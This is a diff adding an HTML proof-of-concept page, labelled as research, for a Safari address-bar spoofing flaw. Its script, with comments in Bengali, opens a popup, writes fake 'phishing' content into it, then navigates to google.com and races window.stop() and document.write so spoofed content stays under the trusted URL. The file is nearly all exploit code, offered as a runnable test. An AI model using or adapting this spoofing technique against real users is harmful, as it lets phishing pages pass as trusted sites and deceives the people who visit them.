@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2025-43493 Research PoC</title>
+</head>
+<body>
+    <h1>Safari Address Bar Spoofing Research</h1>
+    <p>This is a simulated test for educational research.</p>
+    
+    <button onclick="simulateSpoof()">Run Test</button>
+
+    <script>
+        function simulateSpoof() {
+            // ১. একটি নতুন ব্ল্যাঙ্ক উইন্ডো খোলা
+            var win = window.open("about:blank", "_blank", "width=500,height=500");
+
+            // ২. উইন্ডোতে ভুয়া কন্টেন্ট রাইট করা
+            win.document.write("<h1>Phishing Page Content</h1><p>The URL bar might show a trusted site.</p>");
+
+            // ৩. একটি নির্দিষ্ট সময় পর (রেস কন্ডিশন) ট্রাস্টেড সাইটে নেভিগেট করার কমান্ড দেওয়া
+            // প্যাচ না থাকলে, ব্রাউজার ইউআরএল আপডেট করে ফেলে কিন্তু কন্টেন্ট ক্লিয়ার করে না
+            setTimeout(function() {
+                try {
+                    win.location.href = "https://google.com";
+                    
+                    // ৪. খুব দ্রুত কন্টেন্ট ইনজেক্ট করার চেষ্টা করা যাতে নেভিগেশন "Interrupt" হয়
+                    setTimeout(function() {
+                        win.stop(); // লোডিং থামিয়ে দেওয়া
+                        win.document.write("<h2>Still Spoofed!</h2>");
+                    }, 5); 
+
+                } catch (e) {
+                    console.log("Navigation blocked or handled correctly by the browser.");
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
